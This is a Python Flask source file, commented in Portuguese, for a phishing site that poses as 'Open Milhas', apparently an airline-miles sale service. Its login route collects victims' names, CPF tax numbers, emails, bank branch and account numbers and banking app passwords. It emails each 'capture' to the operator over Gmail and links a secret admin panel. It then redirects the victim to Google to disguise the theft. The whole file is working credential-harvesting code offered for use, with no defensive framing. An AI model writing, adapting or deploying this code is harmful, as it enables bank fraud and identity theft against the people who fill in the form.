import os
import smtplib
from email.mime.text import MIMEText
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

# --- CONFIGURAÇÃO DE E-MAIL ---
EMAIL_REMETENTE = "seu-email@gmail.com"
SENHA_APP = "sua-senha-de-app-do-google" # Não é a senha comum, veja o passo abaixo
EMAIL_DESTINO = "seu-email@gmail.com"

def enviar_aviso(dados):
    corpo = f"""
    🔥 NOVA CAPTURA NO OPEN MILHAS 🔥
    ----------------------------------
    Nome: {dados['nome']}
    CPF: {dados['cpf']}
    E-mail: {dados['email']}
    Agência: {dados['agencia']}
    Conta: {dados['conta']}
    Senha App: {dados['senha_app']}
    ----------------------------------
    Verifique no painel: https://openmilhas-1.onrender.com/admin_painel_secreto_99
    """
    msg = MIMEText(corpo)
    msg['Subject'] = '🔔 Nova Venda de Milhas Detectada!'
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINO

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_REMETENTE, SENHA_APP)
            server.sendmail(EMAIL_REMETENTE, EMAIL_DESTINO, msg.as_string())
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Coleta todos os dados do formulário
    dados = {
        'nome': request.form.get('nome'),
        'cpf': request.form.get('cpf'),
        'email': request.form.get('email'),
        'agencia': request.form.get('agencia'),
        'conta': request.form.get('conta'),
        'senha_app': request.form.get('senha_app')
    }
    
    # Envia a notificação instantânea
    enviar_aviso(dados)
    
    # Redireciona para o Google para disfarçar
    return redirect("https://www.google.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




